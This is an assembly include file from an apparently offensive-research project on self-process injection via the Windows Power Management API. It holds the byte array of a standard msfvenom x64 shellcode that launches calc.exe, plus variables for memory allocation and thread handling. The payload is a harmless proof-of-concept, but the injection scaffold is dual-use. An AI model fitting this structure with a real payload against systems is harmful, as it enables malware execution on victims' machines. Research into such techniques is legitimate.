; @file      SHELLCODE.INC
; @data      07-08-2020
; @author    Paul Laîné (@am0nsec)
; @version   1.0
; @brief     Variable and shellcode for self-process injection.
; @details	
; @link      https://vxug.fakedoma.in/papers/VXUG/Exclusive/AbusingtheWindowsPowerManagementAPI.pdf
; @copyright This project has been released under the GNU Public License v3 license.

_DATA$00 SEGMENT PAGE 'DATA'
	
  ; Basic msfvenom windows/x64/exec with CMD="calc.exe"
	sc1 BYTE 0fch, 48h, 83h, 0e4h, 0f0h, 0e8h, 0c0h, 00h, 00h, 00h, 41h, 51h, 41h, 50h, 52h, 51h, 56h, 48h, 31h, 0d2h, 65h, 48h, 8bh, 52h, 60h, 48h, 8bh, 52h, 18h, 48h
	sc2 BYTE 8bh, 52h, 20h, 48h, 8bh, 72h, 50h, 48h, 0fh, 0b7h, 4ah, 4ah, 4dh, 31h, 0c9h, 48h, 31h, 0c0h, 0ach, 3ch, 61h, 7ch, 02h, 2ch, 20h, 41h, 0c1h, 0c9h, 0dh, 41h
	sc3 BYTE 01h, 0c1h, 0e2h, 0edh, 52h, 41h, 51h, 48h, 8bh, 52h, 20h, 8bh, 42h, 3ch, 48h, 01h, 0d0h, 8bh, 80h, 88h, 00h, 00h, 00h, 48h, 85h, 0c0h, 74h, 67h, 48h, 01h
	sc4 BYTE 0d0h, 50h, 8bh, 48h, 18h, 44h, 8bh, 40h, 20h, 49h, 01h, 0d0h, 0e3h, 56h, 48h, 0ffh, 0c9h, 41h, 8bh, 34h, 88h, 48h, 01h, 0d6h, 4dh, 31h, 0c9h, 48h, 31h, 0c0h
	sc5 BYTE 0ach, 41h, 0c1h, 0c9h, 0dh, 41h, 01h, 0c1h, 38h, 0e0h, 75h, 0f1h, 4ch, 03h, 4ch, 24h, 08h, 45h, 39h, 0d1h, 75h, 0d8h, 58h, 44h, 8bh, 40h, 24h, 49h, 01h, 0d0h
	sc6 BYTE 66h, 41h, 8bh, 0ch, 48h, 44h, 8bh, 40h, 1ch, 49h, 01h, 0d0h, 41h, 8bh, 04h, 88h, 48h, 01h, 0d0h, 41h, 58h, 41h, 58h, 5eh, 59h, 5ah, 41h, 58h, 41h, 59h
	sc7 BYTE 41h, 5ah, 48h, 83h, 0ech, 20h, 41h, 52h, 0ffh, 0e0h, 58h, 41h, 59h, 5ah, 48h, 8bh, 12h, 0e9h, 57h, 0ffh, 0ffh, 0ffh, 5dh, 48h, 0bah, 01h, 00h, 00h, 00h, 00h
	sc8 BYTE 00h, 00h, 00h, 48h, 8dh, 8dh, 01h, 01h, 00h, 00h, 41h, 0bah, 31h, 8bh, 6fh, 87h, 0ffh, 0d5h, 0bbh, 0f0h, 0b5h, 0a2h, 56h, 41h, 0bah, 0a6h, 95h, 0bdh, 9dh, 0ffh
	sc9 BYTE 0d5h, 48h, 83h, 0c4h, 28h, 3ch, 06h, 7ch, 0ah, 80h, 0fbh, 0e0h, 75h, 05h, 0bbh, 47h, 13h, 72h, 6fh, 6ah, 00h, 59h, 41h, 89h, 0dah, 0ffh, 0d5h, 63h, 61h, 6ch
	sca BYTE 63h, 2eh, 65h, 78h, 65h, 00h

	scl           DWORD sizeof sc1 + sizeof sc2 + sizeof sc3 + sizeof sc4 + sizeof sc5 + sizeof sc6 + sizeof sc7 + sizeof sc8 + sizeof sc9 + sizeof sca
	lpAddress     QWORD ?
	sDataSize     QWORD ?
	OldProtect    DWORD ?
	hThreadHandle QWORD ?
	Timeout       LARGE_INTEGER <>
_DATA$00 ENDS
